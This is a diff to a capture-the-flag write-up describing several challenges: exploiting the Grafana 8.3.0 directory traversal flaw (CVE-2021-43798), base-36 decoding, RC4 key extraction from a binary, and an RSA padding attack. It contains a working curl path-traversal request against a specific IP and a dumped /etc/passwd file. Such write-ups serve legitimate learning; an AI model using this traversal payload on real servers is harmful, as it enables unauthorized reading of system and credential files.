@@ -47,11 +47,22 @@ Explored grafana metrics (`http://13.126.50.182:3000/metrics`), which exposed Gr
 After someone changed password and doubt clarified about login issue, I had to repivot. Suspecting a vulnerability in Grafana, I checked `/login` page, which revealed Grafana `version 8.3.0`.
 ![alt text](images/image-1.png)
 
-Searching online, I found a know [directory traversal and Local File inclusion (LFI) vulnerability](https://www.exploit-db.com/exploits/50581) (CVE-2021-43798). Using this exploit I accessed server files.
+Searching online, I found a know [directory traversal and Local File inclusion (LFI) vulnerability](https://www.exploit-db.com/exploits/50581) (CVE-2021-43798). Using this exploit I was able to access server files.
 - Key findings: I accessed `/etc/passwd`, though nothing juicy was found there. I also accessed `grafana.db` but even that didn't reveal any hidden information.
 
+```
+/etc/passwd
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+...
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
+```
+
 ### Step 9: Hint release and Flag Discovery
-After some days, a hint was released that pointed to some `temporary location` on server. After some tries, I got the flag file located at `/tmp/flag` on the server.
+After some days, a hint was released that pointed to some `temporary location` on server. Since I already found LFI, after some tries, I got the flag file located at `/tmp/flag` on the server.
 ```bash
 curl --path-as-is http://13.126.50.182:3000/public/plugins/prometheus/../../../../../../../../../../../tmp/flag
 ```
@@ -133,7 +144,7 @@ After hints were released, I revisited reddit posts. Where there were random num
 ```
 
 ### Step 13: Cryptographic Decodings
-Hints pointed to base\<X> encodings. So I used [dcode.fr's cipher identifier](https://www.dcode.fr/identification-chiffrement). That suggested cipher was `Chiffee Base 36`. On decoding it, I got 
+Hints pointed to base\<X> encodings. So I used [dcode.fr's cipher identifier](https://www.dcode.fr/identification-chiffrement). The suggested cipher was `Chiffee Base 36`. On decoding it, I got 
 ```
 7JJFI MMM 8DIJ06H0C 2EC 8 B8A4 0DEDOC8JO IEC4J8C4IRSRS
 ```
@@ -153,7 +164,7 @@ Found flag in version history.
 ## Flag 5: Reverse Engineering and RC4 Encryption
 
 ### Step 15: Binary Analysis
-A binary file was provided via a link. Using IDA Pro, I decompiled it to pseudocode and identified an RC4 stream cipher. The `.text` section of main_encrypt contained the key `super_secret_key`, and the `.rodata` section had the ciphertext `6b50928708d30d85c1dbe9fe69101897f88908c907452a44a8`.
+A binary file was provided via a link. Using IDA Pro, I decompiled it to pseudocode, identified RC4 stream cipher and tried to reverse the code. Being unsuccessful, I switched to IDA-view to get the flow of the binary. The `.text` section of `main_encrypt` contained the key `super_secret_key`, and the `.rodata` section had the ciphertext `6b50928708d30d85c1dbe9fe69101897f88908c907452a44a8`.
 
 ### Step 16: Decryption
 Using an [online RC4 decoder](https://cryptii.com/pipes/rc4-encryption), I decrypted the ciphertext with the key, yielding the flag 5.
@@ -193,11 +204,12 @@ Once this was passed, I got access to the actual challenge interface, which gave
 2. View part2.py
 3. Encrypt a padded message
 
+Option 1, 2 gave the source code.
 Option 3 let me supply a padding and gave back
 
 Ciphertext : $(m + pad)^e \mod n$
 
-This was attack surface foor polynomial GCD attack in RSA with small exponent.
+This was attack surface for polynomial GCD attack in RSA with small exponent.
 
 Writing a small script did the job.
 
